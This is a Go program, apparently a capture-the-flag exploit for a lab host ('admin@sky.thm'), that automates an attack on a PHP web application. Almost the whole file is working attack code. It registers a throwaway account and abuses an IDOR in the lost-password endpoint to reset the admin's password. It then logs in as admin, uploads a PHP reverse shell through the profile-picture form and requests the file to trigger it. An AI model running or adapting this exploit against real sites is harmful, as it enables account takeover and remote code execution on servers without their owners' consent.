package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"mime/multipart"
	"net/http"
	"net/http/cookiejar"
	"net/textproto"
	"net/url"
	"os"
	"regexp"
	"time"
)

const EnableVirtualTerminalProcessing uint32 = 0x4

var ANSI_SET bool = false

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type Client struct {
	baseURL string
	Route   string
	Session *http.Client
}

type UserInfo struct {
	Username string
	Password string
}

//================================================================================
//
// Function Name: CreateMultiPartData_Password
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to create the multipart form data that will be used
//  when POSTing to change the admin's password.
//
// Input(s):
//
//  newpass - string. new password for admin user.
//  targetuser - string. user to change password for.
//  fileWriter - *multipart.Writer. writer to use for upload.
//
// Return(s):
//
//  success - bool. indication of successful execution.
//  message - string. status message.
//
//================================================================================
func (c *Client) CreateMultiPartData_Password(newpass string, targetuser string, fileWriter *multipart.Writer) (success bool, message string) {
	defer fileWriter.Close()

	var err error
	var part io.Writer

	//------------------------------------------------------------
	// Set CSRF part
	//------------------------------------------------------------

	header := make(textproto.MIMEHeader)
	header.Set("Content-Disposition", fmt.Sprintf("form-data; name=\"%s\"", "ci_csrf_token"))
	header.Del("Content-Type")
	part, err = fileWriter.CreatePart(header)
	if err != nil {
		return false, err.Error()
	}
	part.Write([]byte(""))

	//------------------------------------------------------------
	// Add UNAME part
	//------------------------------------------------------------

	header.Set("Content-Disposition", fmt.Sprintf("form-data; name=\"%s\"", "uname"))
	part, err = fileWriter.CreatePart(header)
	if err != nil {
		return false, err.Error()
	}
	part.Write([]byte(targetuser))

	//------------------------------------------------------------
	// Add NPASS part
	//------------------------------------------------------------

	header.Set("Content-Disposition", fmt.Sprintf("form-data; name=\"%s\"", "npass"))
	part, err = fileWriter.CreatePart(header)
	if err != nil {
		return false, err.Error()
	}
	part.Write([]byte(newpass))

	//------------------------------------------------------------
	// Add CPASS part
	//------------------------------------------------------------

	header.Set("Content-Disposition", fmt.Sprintf("form-data; name=\"%s\"", "cpass"))
	part, err = fileWriter.CreatePart(header)
	if err != nil {
		return false, err.Error()
	}
	part.Write([]byte(newpass))

	//------------------------------------------------------------
	// Add SUBMIT part
	//------------------------------------------------------------

	header.Set("Content-Disposition", fmt.Sprintf("form-data; name=\"%s\"", "send"))
	part, err = fileWriter.CreatePart(header)
	if err != nil {
		return false, err.Error()
	}
	part.Write([]byte("Submit"))

	return true, "multipart data created"
}

//================================================================================
//
// Function Name: CreateMultiPartData_ProfilePicture
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to create the multipart form data that will be used
//  when POSTing to the update profile endpoint.
//
// Input(s):
//
//  filename - string. name of file to upload.
//  content - []byte. byte content of the file to upload.
//  fileWriter - *multipart.Writer. writer to use for upload.
//
// Return(s):
//
//  success - bool. indication of successful execution.
//  message - string. status message.
//
//================================================================================
func (c *Client) CreateMultiPartData_ProfilePicture(filename string, content []byte, fileWriter *multipart.Writer) (success bool, message string) {
	defer fileWriter.Close()

	//------------------------------------------------------------
	// Set PHP Reverse Shell part
	//------------------------------------------------------------

	header := make(textproto.MIMEHeader)
	header.Set("Content-Disposition", fmt.Sprintf("form-data; name=\"%s\"; filename=\"%s\"", "pimage", filename))
	header.Set("Content-Type", "application/x-php")

	SysMsgNB("creating part data ...")
	part, err := fileWriter.CreatePart(header)
	if err != nil {
		return false, err.Error()
	}
	part.Write(content)

	//------------------------------------------------------------
	// Set CSRF part
	//------------------------------------------------------------

	header.Set("Content-Disposition", fmt.Sprintf("form-data; name=\"%s\"", "ci_csrf_token"))
	header.Del("Content-Type")
	part, err = fileWriter.CreatePart(header)
	if err != nil {
		return false, err.Error()
	}
	part.Write([]byte(""))

	//------------------------------------------------------------
	// Add UNAME part
	//------------------------------------------------------------

	header.Set("Content-Disposition", fmt.Sprintf("form-data; name=\"%s\"", "uname"))
	part, err = fileWriter.CreatePart(header)
	if err != nil {
		return false, err.Error()
	}
	part.Write([]byte("ADMIN"))

	//------------------------------------------------------------
	// Add SUBMIT part
	//------------------------------------------------------------

	header.Set("Content-Disposition", fmt.Sprintf("form-data; name=\"%s\"", "submit"))
	part, err = fileWriter.CreatePart(header)
	if err != nil {
		return false, err.Error()
	}
	part.Write([]byte("Edit Profile"))

	return true, "multipart data created"
}

// ============================================================
//
// Function Name: GetBodyContent
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take make a GET request to a target
//  route and return the body content to the user.
//
// Input(s):
//
//  route - string. route to make GET request on.
//
// Return(s):
//
//  bodycontent - []byte. content pulled from target URL.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) GetBodyContent(route string) (bodycontent []byte, err error) {
	var targetURL string = fmt.Sprintf("%s/%s", c.baseURL, route)

	resp, err := c.Session.Get(targetURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return bodycontent, nil
}

// ============================================================
//
// Function Name: Login
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to login to the target site as a
//  specified user. Once login is complete, the cookies will be
//  set to persist the session.
//
// Input(s):
//
//  user - UserInfo. struct containing username and password.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) Login(user UserInfo) (success bool, message string) {
	const targetroute string = "v2/admin/logincheck.php"
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)
	var urlparams url.Values = url.Values{}

	urlparams.Set("user", user.Username)
	urlparams.Set("pass", user.Password)
	urlparams.Set("csrf_tokent", "")
	urlparams.Set("submit", "")

	resp, err := c.Session.PostForm(targeturl, urlparams)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return false, fmt.Sprintf("bad status code (%s)", resp.Status)
	}

	c.Session.Jar.SetCookies(resp.Request.URL, resp.Cookies())

	return true, "login successful"
}

// ============================================================
//
// Function Name: Logout
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to logout the currently logged in user.
//  This is necessary to perform the attack, because the admin
//  user must be switched to to upload a reverse shell.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) Logout() (success bool, message string) {
	const targetroute string = "v2/admin/logout.php"
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)

	resp, err := c.Session.Get(targeturl)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	if (resp.StatusCode != 302) && (resp.StatusCode != 200) {
		return false, fmt.Sprintf("bad status code (%s)", resp.Status)
	}

	return true, "logout successful"
}

// ============================================================
//
// Function Name: RegisterUser
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to generate a random username and
//  password combination and register it on the target website.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  user - UserInfo. struct containing username and password.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) RegisterUser() (user UserInfo, success bool, message string) {
	var err error
	var password string
	const phone string = "1111111111"
	var resp *http.Response
	const targetroute string = "v2/admin/reg.php"
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)
	var urlparams url.Values = url.Values{}
	var username string

	user = UserInfo{}

	username, success, message = GenRandomName()
	if !success {
		return UserInfo{}, false, fmt.Sprintf("error generating username: %s", message)
	}
	username = fmt.Sprintf("%s@test.test", username)

	password, success, message = GenRandomName()
	if !success {
		return UserInfo{}, false, fmt.Sprintf("error generating password: %s", message)
	}

	user.Username = username
	user.Password = password

	urlparams.Set("User_Email", user.Username)
	urlparams.Set("User_Pass", user.Password)
	urlparams.Set("conpass", user.Password)
	urlparams.Set("Us_Cont", phone)
	urlparams.Set("csrf_token", "")
	urlparams.Set("submit", "")

	resp, err = c.Session.PostForm(targeturl, urlparams)
	if err != nil {
		return UserInfo{}, false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return UserInfo{}, false, fmt.Sprintf("bad status code (%s)", resp.Status)
	}

	return user, true, "user successfully registered"
}

// ============================================================
//
// Function Name: ResetPassword
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to reset the admin password for the
//  target webpage. This takes advantage of an IDOR.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) ResetPassword() (user UserInfo, success bool, message string) {
	var contentBuf *bytes.Buffer = new(bytes.Buffer)
	var err error
	var newpass string
	var mimedata multipart.Writer = *multipart.NewWriter(contentBuf)
	var resp *http.Response
	const targetroute string = "v2/lostpassword.php"
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)
	const targetuser string = "admin@sky.thm"

	newpass, success, message = GenRandomName()
	if !success {
		return UserInfo{}, false, message
	}

	success, message = c.CreateMultiPartData_Password(newpass, targetuser, &mimedata)
	if !success {
		return UserInfo{}, false, message
	}

	resp, err = c.Session.Post(targeturl, mimedata.FormDataContentType(), contentBuf)
	if err != nil {
		return UserInfo{}, false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return UserInfo{}, false, fmt.Sprintf("bad status code (%s)", resp.Status)
	}

	user.Username = "admin@sky.thm"
	user.Password = newpass

	return user, true, fmt.Sprintf("admin password set to \"%s\"", newpass)
}

// ============================================================
//
// Function Name: TriggerShell
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to set off the reverse shell that was
//  previously uploaded by the program.
//
// Input(s):
//
//  filename - string. name of reverse shell file.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) TriggerShell(filename string) (success bool, message string) {
	var err error
	var resp *http.Response
	const targetroute string = "v2/profileimages"
	var targeturl string = fmt.Sprintf("%s/%s/%s", c.baseURL, targetroute, filename)

	resp, err = c.Session.Get(targeturl)
	if err != nil {
		if os.IsTimeout(err) {
			return true, "timeout hit. reverse shell running"
		}
		return false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return false, fmt.Sprintf("bad status code (%s)", resp.Status)
	}

	return true, "reverse shell activated"
}

// ============================================================
//
// Function Name: TriggerShell
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to upload a reverse shell to the target
//  by poisoning the admin's profile picture.
//
// Input(s):
//
//  filename - string. name of reverse shell file.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) UploadReverseShell(filename string) (success bool, message string) {
	var contentBuf *bytes.Buffer = new(bytes.Buffer)
	var err error
	var filecontent []byte
	var fptr *os.File
	var mimedata multipart.Writer = *multipart.NewWriter(contentBuf)
	var resp *http.Response
	const targetroute string = "v2/profile.php"
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)

	fptr, err = os.Open(filename)
	if err != nil {
		return false, err.Error()
	}
	defer fptr.Close()

	filecontent, err = ioutil.ReadAll(fptr)
	if err != nil {
		return false, err.Error()
	}

	success, message = c.CreateMultiPartData_ProfilePicture(filename, filecontent, &mimedata)
	if !success {
		return false, message
	}

	resp, err = c.Session.Post(targeturl, mimedata.FormDataContentType(), contentBuf)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return false, fmt.Sprintf("bad status code (%s)", resp.Status)
	}

	return true, "reverse shell successfully uploaded"
}

// ============================================================
//
// Function Name: Testconnection
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to test the connection to a target.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) TestConnection() (success bool, message string) {
	SysMsgNB(fmt.Sprintf("testing connection to \"%s\"", c.baseURL))

	resp, err := c.Session.Get(c.baseURL)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	return true, "client connection successful"
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func ValidatePort(portno int) (success bool, message string) {
	if (portno < 1) || (portno > 65535) {
		return false, "port must be between 1 and 65535"
	}
	return true, "port valid"
}

//============================================================
//
// Function Name: PrintCenter
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to print a message in the center of a
//  specified number of columns (n).
//
// Input(s):
//
//  msg - string. message to display.
//  n - int. total number of columns in row.
//
// Return(s):
//
//  None
//
//============================================================
func PrintCenter(msg string, n int) {
	var ansi_indent string = "\x1b%s"
	var indent_format string = "[%dC"
	var indent int

	fmt.Printf("%s", ANSI_CLRLN)
	if len(msg) > n {
		fmt.Printf("%s\n", msg)
		return
	}

	indent = (n - len(msg)) / 2
	indent_format = fmt.Sprintf(indent_format, indent)
	ansi_indent = fmt.Sprintf(ansi_indent, indent_format)

	fmt.Printf("%s%s%s%s\n", ansi_indent, ANSI_YLW, msg, ANSI_RST)

	return
}

func PrintChar(char byte, n int) {
	if n < 1 {
		return
	}

	for i := 0; i < n; i++ {
		fmt.Printf("%s%s%s", ANSI_RED, string(char), ANSI_RST)
	}
	fmt.Printf("\n")
}

//============================================================
//
// Function Name: FindMatch
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take a byte slice, search the slice
//  for a given regular expression pattern, and return the
//  first match of that pattern.
//
// Input(s):
//
//  bodycontent - []byte. byte slice to search for pattern.
//  tgtpattern - string. regex pattern to search for.
//
// Return(s):
//
//  match - string. first match of pattern discovered.
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func FindMatch(bodycontent []byte, tgtpattern string) (match string, success bool, message string) {

	re, err := regexp.Compile(tgtpattern)
	if err != nil {
		return "", false, err.Error()
	}

	matches := re.FindAll(bodycontent, -1)

	if len(matches) < 1 {
		return "", false, "no match found"
	}

	match = string(matches[0])

	return match, true, "match found"
}

// ============================================================
//
// Function Name: GenRandomName
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to generate a random string 8 characters
//  long, containing only alpha-numeric characters.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func GenRandomName() (name string, success bool, message string) {
	const charset string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	const length int = 8

	name = ""

	for i := 0; i < length; i++ {
		name = fmt.Sprintf("%s%s", name, string(charset[rand.Intn(len(charset))]))
	}

	return name, true, "name successfully generated"
}

func init() {
	return
}

func main() {
	rand.Seed(time.Now().Unix())
	var err error

	var domain string
	var port int

	var baseURL string
	var scheme string

	var secure bool

	var revshell string

	var sessioncookies *cookiejar.Jar
	var client Client = Client{Session: &http.Client{Timeout: 10 * time.Second}}

	sessioncookies, err = cookiejar.New(nil)
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}
	client.Session.Jar = sessioncookies

	flag.StringVar(&domain, "d", "127.0.0.1", "domain or ip address of target")
	flag.IntVar(&port, "p", 80, "port to communicate with target on")
	flag.StringVar(&revshell, "r", "revshell.php", "reverse shell php file to upload")
	flag.BoolVar(&secure, "s", false, "use HTTPS instead of HTTP")
	flag.Parse()

	success, message := ValidatePort(port)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}

	PrintChar('=', 60)
	PrintCenter("Target Information", 60)
	PrintChar('=', 60)
	InfMsg(fmt.Sprintf("Target Domain: %s", domain))
	InfMsg(fmt.Sprintf("Target Port: %d", port))
	InfMsg(fmt.Sprintf("HTTPS: %v", secure))
	InfMsg(fmt.Sprintf("Reverse Shell: %s", revshell))
	PrintChar('=', 60)

	//============================================================
	// HTTPS check.
	//============================================================
	if secure {
		scheme = "https"
	} else {
		scheme = "http"
	}
	baseURL = fmt.Sprintf("%s://%s:%d", scheme, domain, port)

	client.baseURL = baseURL

	//============================================================
	// Make sure the target is reachable.
	//============================================================
	success, message = client.TestConnection()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	//============================================================
	// Register new user
	//============================================================
	user, success, message := client.RegisterUser()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(fmt.Sprintf("user registered: \"%s:%s\"", user.Username, user.Password))

	//============================================================
	// Login with newly registered user
	//============================================================
	success, message = client.Login(user)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	//============================================================
	// Change admin password
	//============================================================
	user, success, message = client.ResetPassword()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	//============================================================
	// Logout newly registered user
	//============================================================
	success, message = client.Logout()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	//============================================================
	// Login with new admin user password
	//============================================================
	success, message = client.Login(user)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	//============================================================
	// Upload PHP reverse shell
	//============================================================
	success, message = client.UploadReverseShell(revshell)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	//============================================================
	// Start reverse shell
	//============================================================
	success, message = client.TriggerShell(revshell)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	//============================================================
	// Logout of admin user
	//============================================================
	success, message = client.Logout()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	return
}

